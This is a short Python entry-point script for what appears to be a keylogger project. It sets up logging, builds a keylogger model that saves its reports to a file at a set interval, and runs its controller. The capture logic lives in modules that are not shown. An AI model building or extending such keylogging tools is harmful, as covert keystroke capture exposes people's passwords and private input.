import logging
from models.keylogger_model import KeyloggerModel
from controllers.keylogger_controller import KeyloggerController
from config.keylogger_config import Config

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    config = Config()
    keylogger_model = KeyloggerModel(interval=config.save_report_every, method="file")
    keylogger_controller = KeyloggerController(model=keylogger_model)
    
    keylogger_controller.run()
